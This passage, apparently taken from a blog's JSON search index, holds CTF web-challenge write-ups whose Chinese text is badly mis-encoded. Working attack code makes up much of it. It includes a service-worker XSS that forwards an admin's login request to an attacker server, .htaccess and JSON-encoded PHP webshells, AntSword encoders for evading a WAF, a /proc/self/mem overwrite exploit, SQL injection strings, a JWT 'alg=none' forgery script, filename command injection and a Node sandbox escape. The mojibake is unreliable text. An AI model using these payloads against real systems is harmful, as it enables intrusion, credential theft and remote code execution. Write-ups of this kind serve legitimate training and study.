amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#34;&amp;#41;&lt;/script&gt; å°†cookie leakå‡ºæ¥ã€‚ ![image-20201128175030199]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201128175030199.png&#41; è®¿é—®admin.phpï¼Œå‘ç°ä¸€ä¸ªsqlæ³¨å…¥ç‚¹ï¼Œäº¦æˆ–æ³¨å…¥ï¼Œæ‹¿åˆ°flagã€‚ [XNUCA2019Qualifier]EasyPHPåˆ©ç”¨.htaccessè‡ªåŒ…å«æ‰§è¡ŒPHPä»£ç ã€‚ 1php_value%20auto_prepend_fil%5C%0Ae%20.htaccess%0A%23%3C%3Fphp%20system&amp;#40;&apos;cat%20%2Fflag&apos;&amp;#41;%3B%3F%3E%0A%23%5C","categories":[],"tags":[]},{"title":"è¥¿æ¹–è®ºå‰‘èµ›åå¤ç°","slug":"è¥¿æ¹–è®ºå‰‘","date":"2020-10-11T16:00:00.000Z","updated":"2020-10-16T11:23:54.881Z","comments":true,"path":"2020/10/12/è¥¿æ¹–è®ºå‰‘/","link":"","permalink":"http://yoursite.com/2020/10/12/è¥¿æ¹–è®ºå‰‘/","excerpt":"","text":"HardXssè¿™é“é¢˜æ‰“å¼€å‘ç°åœ¨loginStatuså¤„æœ‰ä¸€ä¸ªjsonpï¼Œè€Œä¸”åœ¨loginå¤„èƒ½å¤Ÿæ§åˆ¶jsonpè¿”å›çš„å†…å®¹ï¼Œé¦–å…ˆç®€è¦çš„ä»‹ç»ä¸€ä¸‹jsonpã€‚ jsonpæ¥å£æ˜¯ä¸ºäº†æ–¹ä¾¿åŠ¨æ€æ·»åŠ è·¨ç«™è„šæœ¬è€Œå­˜åœ¨çš„ï¼Œjsonpæ¥å£è¿”å›text/javascriptå½¢å¼çš„æ•°æ®ï¼Œåœ¨å®¢æˆ·ç«¯å“åº”ã€‚ è€Œåœ¨è¿™é¢˜ä¸­ï¼Œå¹¶ä¸æ˜¯ç®€å•çš„æ§åˆ¶ä¸€ä¸‹cookieçš„å¼¹å‡ºï¼Œé¢˜ç›®æè¿°ï¼šadminæ”¶åˆ°é‚®ä»¶åä¼šå…ˆç‚¹å¼€é“¾æ¥ç„¶åç™»å½•ç½‘ç«™ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ‹¦æˆªadminç™»å½•ç½‘ç«™çš„è¯·æ±‚ï¼Œå¹¶è·å¾—è¯·æ±‚å†…å®¹ï¼ˆadminè´¦å·ä¸å¯†ç ï¼‰ï¼Œè¿™å°±éœ€è¦ç”¨åˆ°Service Workerã€‚ å¦‚ä½•ä½¿ç”¨å‘¢ï¼Ÿè¿™é‡Œæœ‰ä¸€ç¯‡æ–‡ç« ä»‹ç»äº†å¦‚ä½•ä½¿ç”¨Service WorkeråŠ«æŒå®¢æˆ·è¯·æ±‚ã€‚Service Workeréœ€è¦HTTPSè¯·æ±‚ï¼Œå¯ä»¥ä½¿ç”¨repl.itã€‚ æ‰€ä»¥æˆ‘ä»¬éœ€è¦åšä¸¤ä»¶äº‹ iframeè·¨åŸŸåŠ è½½jsonpç”¨æ¶æ„ä»£ç æ³¨å†Œservice worker ä½¿ç”¨Service Workeræ¥æ”¶fetchäº‹ä»¶ï¼Œå¹¶å°†å®ƒå¼¹åˆ°è‡ªå·±æœåŠ¡å™¨ä¸­ 12https://xss.hardxss.xhlj.wetolink.com/loginhttps://auth.hardxss.xhlj.wetolink.com/api/loginStatus åœ¨è¿™é‡Œå­˜åœ¨ä¸€ä¸ªè·¨åŸŸé—®é¢˜ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ‹¿å‡ºå¸¸ç”¨çš„iframeï¼Œè®¾ç½®document.domain=hardxss.xhlj.wetolink,å³å¯è§£å†³ 12345678910#1.jsdocument.domain = \"hardxss.xhlj.wetolink.com\";var iframe = document.createElement('iframe');iframe.src = 'https://auth.hardxss.xhlj.wetolink.com';iframe.addEventListener(\"load\", function()&#123; iffLoadover(); &#125;);document.body.appendChild(iframe);exp = `navigator.serviceWorker.register(\"/api/loginStatus?callback=importScripts('https://aa.lifegame.repl.co/2.js');//\")`;function iffLoadover()&#123; iff.contentWindow.eval(exp);&#125; 1234567#2.jsthis.addEventListener('fetch', function (e) &#123; var body = \"&lt;script&gt;location='http://ip:port/1'+location.search;&lt;/script&gt;\"; var init = &#123;headers: &#123;\"Content-Type\": \"text/html\"&#125;&#125;; var res = new Response(body, init); e.respondWith(res.clone());&#125;); åœ¨è¿™æ®µjsä»£ç ä¸­ï¼Œæˆ‘åœ¨æ ¹åŸŸåä¸­æ³¨å†Œäº†ä¸€ä¸ªService Workerï¼Œæ¶æ„ç›‘å¬fetchäº‹ä»¶ï¼Œå¹¶å°†äº‹ä»¶è¿”å›åˆ°æˆ‘çš„æœåŠ¡å™¨ä¸Šï¼Œadminçš„ç™»å½•äº‹ä»¶å°±è¢«æ•è·ã€‚ ç™»å…¥adminï¼Œè·å–flagã€‚ NewUploadè¿™é“é¢˜æ˜¯ä¸€ä¸ªæ™®é€šçš„æ–‡ä»¶ä¸Šä¼ åŠ ä¸Šäº†å®å¡”çš„WAFå’Œdisable_functionã€open_basedirã€‚ å‘ç°PHPä¸èƒ½ä¸Šä¼ ï¼Œå¯¹è¿™ç§WAFä¸€èˆ¬æ¢è¡Œå¯ä»¥é€šæ€ï¼ŒWAFè¿˜æœ‰æ–‡ä»¶å¤´æ£€æµ‹ï¼ŒGETã€POSTä¼ å€¼æ£€æµ‹ï¼Œæ‰€ä»¥éœ€è¦å°†é©¬ç®€å•ç¼–ç ä¸€ä¸‹ï¼ˆbase64æˆ–è€…ä¸‰æ¬¡urlencodeå…¨ç¼–ç éƒ½è¡Œï¼‰ï¼Œç®€å•ç»•ä¸€ä¸‹open_basedirï¼Œå‘ç°è¯»å–flagéœ€è¦é€šè¿‡readflagè·å–flagã€‚ æœ¬é¢˜æœ‰ä¸¤ç§åšæ³• php-fpmç»•è¿‡disable_function ç”±äºæœåŠ¡å™¨iisé™åˆ¶ï¼Œå½“é©¬å¾ˆå¤§æ—¶base64è§£ç éœ€è¦è€—è´¹å¤§é‡æœåŠ¡å™¨èµ„æºï¼Œè¿”å›503ï¼Œæ‰€ä»¥åªèƒ½ä½¿ç”¨ä¸‰æ¬¡urlç¼–ç æ¥ç»•è¿‡ ä¸Šä¼ ä¸€ä¸ªæ²¡æœ‰ç»•è¿‡open_basedirçš„é©¬ï¼Œä¿®æ”¹AntSwordç¼–ç å™¨ï¼Œbase64å’Œurlå…¨ç¼–ç çš„ç¼–ç å™¨éƒ½æ”¾å‡ºæ¥ã€‚ 1234567891011121314151617181920/** * php::base64ç¼–ç å™¨ * Create at: 2020/10/08 11:54:20 */'use strict';/** @param &#123;String&#125; pwd è¿æ¥å¯†ç * @param &#123;Array&#125; data ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„* @return &#123;Array&#125; data ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„*/module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123; let randomID = `_0x$&#123;Math.random().toString(16).substr(2)&#125;`; data[randomID] = Buffer.from(data['_']).toString('base64'); data[pwd] = data[randomID]; delete data['_']; delete data[randomID]; return data;&#125; 123456789101112131415161718192021222324/** * php::urlç¼–ç å™¨ * Create at: 2020/10/12 17:16:57 */'use strict';/** @param &#123;String&#125; pwd è¿æ¥å¯†ç * @param &#123;Array&#125; data ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„* @return &#123;Array&#125; data ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„*/module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123; function urlencode(e, r) &#123; return ++r ? \"%\" + ([10] + e.charCodeAt().toString(16)).slice(-2) : decodeURI(encodeURIComponent(e)).replace(/[^]/g, urlencode) &#125; let randomID = `_0x$&#123;Math.random().toString(16).substr(2)&#125;`; data[randomID] = Buffer.from(data['_']).toString(); data[pwd]=urlencode(urlencode(data[randomID])); delete data['_']; delete data[randomID]; return data;&#125; åœ¨/tmpä¸‹æœ‰php-cgi-74.sockæ–‡ä»¶ï¼Œç›´æ¥ä½¿ç”¨AntSwordçš„æ’ä»¶é€‰æ‹©PHP-FPMï¼Œä¸€é”®æ‰“é€šã€‚ luaè„šæœ¬æ‰§è¡Œreadflag æŠ“åŒ…å‘ç°openrestyï¼Œå¯ä»¥ä¸Šä¼ luaè„šæœ¬ï¼Œå¹¶ä¸Šä¼ .htaccessæ–‡ä»¶è§£æluajiè„šæœ¬å³å¯ 12345678910require \"string\"function handle(r) r.content_type = \"text/plain\" if r.method == 'GET' then local a = io.popen('/readflag') local b = a:read(\"*all\") r:puts(b) end return apache2.OKend 123&lt;Files &quot;*.lua&quot;&gt; SetHandler lua-script&lt;/Files&gt; EasyJsonæŸ¥çœ‹æºç å‘ç°ä½¿ç”¨json_decodeè·å–contentï¼Œç›´æ¥ä½¿ç”¨unicodeç¼–ç ç»•è¿‡ã€‚ payload 123&#123;&quot;\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074&quot;:&quot;\\u003c\\u003f\\u0070\\u0068\\u0070\\u0020\\u0065\\u0076\\u0061\\u006c\\u0028\\u0024\\u005f\\u0050\\u004f\\u0053\\u0054\\u005b\\u0027\\u0061\\u0061\\u0027\\u005d\\u0029\\u003b\\u003f\\u003e&quot;&#125;&#123;&quot;content&quot;:&quot;&lt;?php eval($_POST[&apos;aa&apos;]);?&gt;&quot;&#125; Flagshopè¿™é¢˜æ˜¯ä¸€é“WebPwnï¼Œèµ›åå¤ç°äº†ä¸€ä¸‹ï¼Œå‘ç°è¿˜æŒºåŸºç¡€çš„ã€‚ é€šè¿‡backend.phpè¯»å–æºç å‘ç°å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶å†™å…¥(èƒ½æŒ‡å®šåç§»)å’Œæ–‡ä»¶è¯»å–ï¼Œèµ›åçœ‹å¸ˆå‚…çš„WPï¼Œå‘ç°æ˜¯é€šè¿‡æ”¹å†™å½“å‰è¿›ç¨‹å†…å­˜å†…å®¹ï¼Œå°†openå‡½æ•°çš„åœ°å€(file_get_contentsåŸºäºopenå‡½æ•°å®ç°)æ”¹å†™æˆsystemå‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆè°ƒç”¨file_get_contentså‡½æ•°å°±ç›¸å½“äºè°ƒç”¨systemå‡½æ•°ã€‚ é¦–å…ˆéœ€è¦è¯»å–å†…å­˜ä¿¡æ¯/proc/self/mapsï¼Œè¯¥æ–‡ä»¶åŒ…å«äº†å½“å‰è¿›ç¨‹æ˜ å°„çš„å†…å­˜åŒºåŸŸï¼Œæˆ‘ä»¬å¯ä»¥ä»ä¸­å¾—å€¼å½“å‰ç¨‹åºè°ƒç”¨libcåº“å’Œåç§»åœ°å€ã€‚ å¯ä»¥å¾—çŸ¥åŠ¨æ€é“¾æ¥åº“åœ¨å†…å­˜ä¸­çš„åœ°å€æ˜¯0x7ffff5f40000ï¼Œå°†è¯¥libcåº“ä¸‹è½½ä¸‹æ¥ï¼Œå¯ä»¥å¾—åˆ°systemå‡½æ•°åœ¨libcåº“ä¸­çš„åç§»åœ°å€ï¼Œå†…å­˜åœ°å€+åç§»åœ°å€=çœŸå®åœ°å€ã€‚ ä½¿ç”¨idaæ‰“å¼€ï¼Œæ‰¾åˆ°systemå‡½æ•°åœ¨libcåº“ä¸­çš„åç§»åœ°å€0x0000000000046590ï¼Œæ‰€ä»¥systemåœ¨å†…å­˜ä¸­çš„çœŸå®åœ°å€=0x7ffff5f86590ã€‚ å¾—åˆ°äº†systemå‡½æ•°çš„åœ°å€ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å¾—åˆ°openå‡½æ•°çš„åœ°å€ï¼Œå¯è§ï¼Œå½“å‰libcåº“ä¸­å¹¶æ²¡æœ‰openå‡½æ•°ï¼Œå¯ä»¥å»/proc/self/exeæ–‡ä»¶æ‰¾ä¸€æ‰¾ï¼Œè¯¥æ–‡ä»¶å­˜æ”¾çš„æ˜¯å½“å‰è¿›ç¨‹æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒåŒæ ·çš„ï¼Œå°†å…¶ä¸‹è½½ä¸‹æ¥ï¼Œidaæ‰“å¼€ï¼Œå¯ä»¥å‘ç°openå‡½æ•°åœ¨å†…å­˜ä¸­çš„åç§»ä¸º0x0000000000E9F998ï¼Œä¹Ÿå°±æ˜¯15333784ã€‚ payload: 1?readfile=/readflag&gt;/tmp/aaa&amp;writefile=/proc/self/mem&amp;buffer=%90%65%f8%f5%ff%7f&amp;offset=15333784","categories":[{"name":"è¥¿æ¹–è®ºå‰‘","slug":"è¥¿æ¹–è®ºå‰‘","permalink":"http://yoursite.com/categories/è¥¿æ¹–è®ºå‰‘/"}],"tags":[]},{"title":"BUUCTF1","slug":"BUUCTF2","date":"2020-10-01T16:00:00.000Z","updated":"2020-10-20T13:24:09.100Z","comments":true,"path":"2020/10/02/BUUCTF2/","link":"","permalink":"http://yoursite.com/2020/10/02/BUUCTF2/","excerpt":"","text":"[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunkæ‰“å¼€é¢˜ç›®ï¼ŒæŸ¥çœ‹ç•Œé¢æºç å‘ç°æç¤º?fileï¼Œäºæ˜¯å°†æºç è¯»å–ï¼Œå‘ç°addresså¤„æ²¡æœ‰è¿‡æ»¤ï¼Œåœ¨change.phpä¸­å‘ç°äºŒæ¬¡æ³¨å…¥ç‚¹ éšä¾¿æ³¨å…¥ä»¥ä¸‹ï¼Œå‘ç°æŠ¥é”™ï¼Œæœç„¶å°±æ˜¯æŠ¥é”™æ³¨å…¥äº†ï¼Œæ•°æ®åº“é€›äº†ä¸€åœˆï¼Œå•¥ä¹Ÿæ²¡æœ‰ï¼Œå‘ç°é¢˜ç›®æŠŠload_fileBANäº†ï¼Œå°±è¯•è¯•ç›´æ¥è¯»flagï¼Œå› ä¸ºæ˜¯ciscnçš„é¢˜ç›®ï¼Œæ‰€ä»¥flagéƒ½åœ¨/flag.txtï¼Œç”±äºæŠ¥é”™é•¿åº¦é™åˆ¶ï¼Œåˆ†ä¸¤æ¬¡çˆ†ã€‚ 12&apos;,`address`= updatexml(1,concat(0x3a,(select substr(load_file(&apos;/flag.txt&apos;),1,25)),0x3a),1)#&apos;,`address`= updatexml(1,concat(0x3a,(select substr(load_file(&apos;/flag.txt&apos;),25,50)),0x3a),1)# [Zer0pts2020]Can you guess it?é¢˜ç›®ç»™å‡ºæºç ï¼Œçœ‹äº†ä¸€ä¸‹ï¼Œguessæ˜¯ä¸å¯èƒ½çŒœä¸­ï¼Œä¹Ÿä¸å¯èƒ½ç»•è¿‡çš„ï¼Œæ‰€ä»¥ç‚¹è‚¯å®šåœ¨basename($_SERVER[&#39;PHP_SELF&#39;])è¿™é‡Œã€‚ basenameå‡½æ•°å½“è·¯å¾„ä»¥/ç»“å°¾æ—¶ï¼Œä¼šè¿”å›/å‰é¢çš„å†…å®¹ï¼Œå½“æ–‡ä»¶ååªå«æœ‰ä¸€ä¸ªéasciiç å­—ç¬¦æ—¶ï¼Œbasenameä¼šå°†å®ƒå¿½ç•¥ï¼Œæ‰€ä»¥å¯ä»¥ç”¨/index.php/config.php/%ff?sourceè¯»å–flagã€‚ [HFCTF2020]EasyLoginæ‰“å¼€çœ‹å‘ç°æ˜¯koaæ¡†æ¶ï¼Œç½‘ä¸ŠæŸ¥ä¸€æŸ¥ï¼Œkoaé€šå¸¸ä¼šåœ¨controllersç›®å½•ä¸­å­˜æ”¾å¤„ç†é€»è¾‘jsä»£ç ï¼Œé€šå¸¸æ˜¯æ”¾åœ¨api.js/user.jsä¸­ï¼Œè®¿é—®controllser/api.jså¾—åˆ°é€»è¾‘ä»£ç ï¼Œå‘ç°æ˜¯ä¸€é“JWTä¼ªé€ ã€‚ å½“username=adminæ—¶ï¼Œå¯ä»¥è®¿é—®/flagã€‚ JWTè‡ªèº«åŠ å¯†çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨alg=â€™noneâ€™ç»•è¿‡ï¼Œåªéœ€è¦ç»•è¿‡ä¸‹é¢è¿™ä¸€æ®µä»£ç å°±è¡Œã€‚ 123if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123; throw new APIError('login error', 'no such secret id');&#125; è¿™é‡Œæ—¶ä¸€ä¸ªJSçš„å¼±ç±»å‹é—®é¢˜ï¼Œä»¥ä¸‹ä»£ç æ˜¯æˆç«‹çš„ã€‚ 1234const a =[]if(a==0)&#123; console.log(a)&#125; æˆ‘ä»¬åªéœ€è¦æ„é€ secretid=[]å³å¯ç»•è¿‡åˆ¤æ–­ã€‚ 12345678910111213141516171819import jwtimport timeimport base64import jsonheaders=&#123;'type':'jwt','alg':\"none\"&#125;payload=&#123;'iat':1587378820,'username':'admin','password':'123','secretid':[]&#125;he=json.dumps(headers)pa=json.dumps(payload)a=base64.b64encode(he.encode('utf-8')).decode('utf-8')b=base64.b64encode(pa.encode('utf-8')).decode('utf-8')print(a+'.'+b) [BJDCTF 2nd]æ–‡ä»¶æ¢æµ‹ç­”å¼€é¢˜ç›®ï¼ŒæŠ“åŒ…å‘ç°æç¤ºhome.phpï¼Œè¿›å…¥å‘ç°ç›´æ¥è·³åˆ°äº†system.phpï¼ŒF12å†networkå¤„æŸ¥çœ‹ç½‘ç»œè¯·æ±‚ï¼Œå‘ç°äº†home.php?file=systemè¯·æ±‚ï¼Œè¯•è¯•ä¼ªåè®®è¯»æºç ã€‚ 1file=php://filter/read=convert.base64-encode/resource=home å°†homeå’Œsystemçš„ä»£ç éƒ½è¯»å–å‡ºæ¥ï¼Œå†home.phpä¸­å‘ç°å­˜åœ¨admin.phpï¼Œä½†æ˜¯è¦æœ¬åœ°è®¿é—®ï¼Œflagä¹Ÿè¢«é™åˆ¶çš„æ­»æ­»çš„ï¼Œäºæ˜¯åªèƒ½åœ¨system.phpæ‰¾æ‰¾ã€‚ 1234567891011121314151617181920if (isset($_POST['q1']) &amp;&amp; isset($_POST['q2']) &amp;&amp; isset($_POST['q3']) ) &#123; $url = $_POST['q2'].\".y1ng.txt\"; $method = $_POST['q3']; $str1 = \"~$ python fuck.py -u \\\"\".$url .\"\\\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;\"; echo $str1; if (!preg_match($filter1, $url) )&#123; die($str2); &#125; if (preg_match($filter2, $url)) &#123; die($str3); &#125; if (!preg_match('/^GET/i', $method) &amp;&amp; !preg_match('/^POST/i', $method)) &#123; die($str4); &#125; $detect = @file_get_contents($url, false); print(sprintf(\"$url method&amp;content_size:$method%d\", $detect));&#125; è¦æ±‚q2å¿…é¡»è¦ä»¥http://127.0.0.1å¼€å¤´ï¼Œé‚£ä¼°è®¡å°±æ˜¯ç”¨file_get_contentsæ‰“å¼€admin.phpäº†ï¼Œå‘ç°$urlåœ¨q2åæ‹¼æ¥äº†å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªå¯ä»¥åœ¨q2ååŠ #é”šç‚¹ç¬¦æˆ–è€…å‚æ•°?a=è¿™ç§å½¢å¼ç»•è¿‡ï¼Œæœ€åå‘ç°å®ƒä½¿ç”¨%dæ¥æ‰“å°è¿”å›å†…å®¹ï¼Œè¿™è‚¯å®šè¦æŠŠå®ƒæ”¹æˆ%sæ‰è¡Œã€‚ åœ¨å®˜ç½‘æœåˆ°ï¼Œsprintfèƒ½å¤ŸæŒ‡å®šå‚æ•°ä½ç½®%[argnum$][flags][width][.precision] æ‰€ä»¥å¯ä»¥æŒ‡å®šä½¿ç”¨%1$sèƒ½å¤Ÿå°†$detectè½¬å˜ä¸ºå­—ç¬¦ä¸²è¾“å‡ºã€‚ 1q1=flag&amp;q2=http://127.0.0.1/admin.php?a=%1$s&amp;q3=get åŒæ—¶åœ¨å®˜ç½‘å¯ä»¥çœ‹åˆ° 1notice the double %%, this prints a literal &apos;%&apos; character ä¸¤ä¸ª%%ç¬¦å·ä¼šè¾“å‡ºçœŸæ­£çš„%ï¼Œæ‰€ä»¥ä¹Ÿèƒ½åˆ©ç”¨ 1q1=flag&amp;q2=http://127.0.0.1/admin.php?a=&amp;q3=get%s% æˆåŠŸè·å¾—admin.phpä»£ç  admin.phpçš„é€»è¾‘éå¸¸çš„è„†å¼±ï¼ŒAES-128-CBCçš„åŠ å¯†æ•°æ®æ˜¯å­˜æ”¾åœ¨sessionä¸­çš„ï¼Œå¦‚æœä¸å¸¦sessionidè®¿é—®ï¼ŒåŠ å¯†æ•°æ®å°±æ˜¯ç©ºï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å‡ºåŠ å¯†ç©ºæ•°æ®åçš„$cipher 12345678&lt;?phpfunction aesEn($data, $key)&#123; $method = &apos;AES-128-CBC&apos;; $iv = md5(&quot;174.0.0.15&quot;,true); return base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));&#125;echo aesEn(&apos;&apos;,&apos;y1ng&apos;); å°†ä¸Šé¢çš„è¾“å‡ºä¼ ç»™decryptï¼Œå³å¯å¾—åˆ°flagã€‚ [GYCTF2020]Ezsqliç®€å•åˆ¤æ–­ä¸€ä¸‹ï¼Œæ˜¯ä¸€é“æ•°å­—å‹ç›²æ³¨ï¼Œè¿‡æ»¤äº†orã€unionç­‰å­—ç¬¦ï¼Œé¦–å…ˆå°†æ•°æ®åº“ç‰ˆæœ¬å¼„åˆ° 1if(ascii(substr((version()),1,1))&gt;52,1,0) ç‰ˆæœ¬æ˜¯5.7.29ï¼Œåœ¨æ­¤ç‰ˆæœ¬ä¸­ï¼Œsyså¢åŠ äº†å¯ä»¥æŸ¥çœ‹è¡¨åçš„è§†å›¾ 1select group_concat(table_name) from sys.schema_table_statistics where table_schema=database() å¾—åˆ°è¡¨åf1ag_1s_h3r3_hhhhh,ç”±äºè¿‡æ»¤äº†unionï¼Œåªèƒ½ä½¿ç”¨Row Subqueriesï¼Œåœ¨mysqlä¸­ï¼Œå­—ç¬¦ä¸²çš„æ¯”è¾ƒæ˜¯æŒ‰ç…§å­—å…¸åºæ¥æ¯”çš„å³&#39;g&#39;&gt;&#39;fzz&#39;ï¼Œæ‰€ä»¥ä»¥ä¸‹è¡¨è¾¾å¼æˆç«‹ 1((1,&apos;g&apos;)&gt;(select * from f1ag_1s_h3r3_hhhhh)) å¯ä»¥æŒ‰ç…§è¿™æ ·çš„æ€è·¯å»çˆ†ç ´ï¼Œä¸è¿‡çˆ†ç ´å‡ºæ¥çš„ç»“æœéœ€è¦å‡å»1ã€‚ [N1CTF 2018]eating_cmsæ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•è¿›å»å‘ç°å¯ä»¥ç”¨ä¼ªåè®®è¯»æºç ï¼Œå‘ç°ä½¿ç”¨parseurlæå–å¤„æ•°æ®è¿‡æ»¤ 123$keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;];$uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]);parse_str($uri[&apos;query&apos;], $query); parse_urlåœ¨ç¢°åˆ°æ ¼å¼é”™è¯¯çš„urlæ—¶ï¼Œä¼šè¿”å›False,æ‰€ä»¥æˆ‘ä»¬æ„é€  1http://ip:port//user.php?page=php://filter/convert.base64-encode/resource=m4aaannngggeee å°±å¯ä»¥ç»•è¿‡è¿‡æ»¤ï¼Œç›´æ¥åŒ…å«æ–‡ä»¶ï¼Œå‘ç°ä¸€ä¸ªtemplates/upload.htmlï¼Œè®¿é—®ä¸€ä¸‹ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç‚¹ï¼Œå‘ç°äº†ä¸€ä¸ªæ–‡ä»¶upllloadddd.phpï¼Œä¸Šä¼ æ–‡ä»¶å‘ç°è¿™ä¸ªæ–‡ä»¶å¥½åƒå¹¶ä¸åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œä½¿ç”¨ä¼ªåè®®è¯»å–æºç ï¼Œå‘ç°uploadåœ¨templatesçš„å‰ä¸€çº§ç›®å½•ã€‚ 1php://filter/convert.base64-encode/resource=upllloadddd æ‰€ä»¥æˆ‘ä»¬åªèƒ½ä½¿ç”¨æ–‡ä»¶åŒ…å«m4aaannngggeeeæ¥ä¸Šä¼ æ–‡ä»¶ï¼Œé€šè¿‡è¯»å–æºç å‘ç°ï¼Œfilenameå¹¶ä¸å­˜åœ¨è¿‡æ»¤ï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨filenameè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼ˆPS:æ–‡ä»¶è·¯å¾„ä¼šåœ¨/å¤„æˆªæ–­ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨/ã€‚ 1filename=&quot;glag;cd ..;ls;cat flag_233333 ;#&quot; [RoarCTF 2019]Online ProxyæŠ“åŒ…çœ‹è§äº†IPåœ°å€ï¼ŒXFFå¯ä»¥ä¼ªé€ ï¼Œä¼šè¾“å‡ºå½“å‰IPåœ°å€ä¸ä¸Šæ¬¡çš„IPåœ°å€ï¼Œå½“å½“å‰IPåœ°å€ä¸å˜æ—¶ï¼Œä¸Šæ¬¡çš„IPä¹Ÿä¸ä¼šå˜ï¼Œæ„Ÿè§‰åº”è¯¥æ˜¯å‚¨å­˜å‹SQLæ³¨å…¥ï¼Œåå°é€»è¾‘åº”è¯¥æ˜¯å‰ä¸¤æ¬¡è¾“å…¥æ—¶ï¼Œå­˜å…¥æ•°æ®åº“ï¼ŒæŒ‰ç…§è¾“å…¥é¡ºåºè¾“å‡ºè¾“å…¥å˜é‡ï¼Œå½“ä¸¤æ¬¡è¾“å…¥åï¼Œå°±ä»æ•°æ®åº“è¯»å–IPæ•°æ®ï¼Œè¿™å°±é€ æˆäº†æ³¨å…¥ã€‚ å°†Payloadå­˜å…¥Current Ip å†æ¬¡è¾“å…¥å˜æˆLast Ip å†æ¬¡è¾“å…¥åŒæ ·çš„å€¼ï¼Œå°±è§¦å‘äº†å‚¨å­˜å‹sqlæ³¨å…¥ï¼Œè€Œä¸”æ²¡æœ‰WAFã€‚ è¿™é¢˜çš„flagå­˜åœ¨åˆ«çš„æ•°æ®åº“ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆè¦çˆ†ç ´ä¸€ä¸‹æ•°æ®åº“ï¼Œç„¶åå†ä¸€å¥—æµç¨‹ä¸‹æ¥ï¼Œæ‹¿åˆ°flagã€‚ åœ¨æœ€åæŸ¥flagæ—¶ï¼Œç”±äºæ˜¯è·¨åº“æ“ä½œï¼Œéœ€è¦æŒ‡å®šæ•°æ®åº“åï¼Œä¸ç„¶ä¼šæ‰¾ä¸åˆ°è¡¨æ•°æ®åº“å.è¡¨åã€‚ [GKCTF2020]EZä¸‰å‰‘å®¢-EzNodeæŸ¥çœ‹æºç ï¼Œå‘ç°ä½¿ç”¨äº†safer-evalåº“ï¼Œç‰ˆæœ¬æ˜¯1.3.6ï¼Œsafer-evalé€šè¿‡vmæ¨¡å—åšæ²™ç®±ç¯å¢ƒæ‰§è¡Œä»£ç ï¼Œéš”ç¦»ä»£ç çš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œä¹Ÿå°±æ˜¯è¯´æ²™ç®±å†…éƒ¨æ— æ³•è®¿é—®å¤–éƒ¨églobalå˜é‡ï¼Œä½†æ˜¯å¤–éƒ¨å¯ä»¥è®¿é—®åˆ°æ²™ç®±å†…éƒ¨å˜é‡ã€‚ åˆšè¯´åˆ°å¯ä»¥ä½¿ç”¨å…¨å±€å˜é‡ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡processå…¨å±€å¯¹è±¡çš„mainModuleå±æ€§æ¥è·å–å½“å‰Moduleï¼Œç„¶ååŠ è½½child_processå­è¿›ç¨‹æ¨¡å—ï¼Œè¯¥æ¨¡å—ä¸­æœ‰è®¸å¤šå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•æ¯”å¦‚execSyncã€‚ safer-evalå¯¹ä¼šå¯¹vmæ²™ç®±ä¸­çš„å˜é‡å€¼è¿›è¡Œè¿‡æ»¤ï¼Œå¦‚æœç¢°åˆ°globalå˜é‡å°±å°†å®ƒèµ‹å€¼ä¸ºundefinedï¼Œprocessæ˜¾ç„¶åœ¨å…¶ä¸­ï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Œå˜é‡ä¸­ä¸èƒ½ç›´æ¥æœ‰processï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨æ„é€ å‡½æ•°Function(â€œreturn processâ€);è¿™æ ·ä¹Ÿèƒ½è¿”å›processçš„å€¼ï¼Œä½†æ˜¯Functionä¹Ÿåœ¨é»‘åå•ä¸­ï¼Œé€šè¿‡è§‚å¯Ÿsafer-evalçš„æºç ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°safer-evalåœ¨æ²™ç®±çš„ä¸Šä¸‹æ–‡ä¸­æ·»åŠ äº†6ä¸ªå¯ä½¿ç”¨å‡½æ•° 1&apos;clearImmediate&apos;,&apos;clearInterval&apos;,&apos;clearTimeout&apos;,&apos;setImmediate&apos;,&apos;setInterval&apos;,&apos;setTimeout&apos; æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨clearImmediate.constructoræ¥è·å¾—Functionã€‚ 1const a=clearImmediate.constructor(&quot;return process;&quot;)(); æ„é€ å‡½æ•°å¹¶æ‰§è¡Œè¿”å›processã€‚ 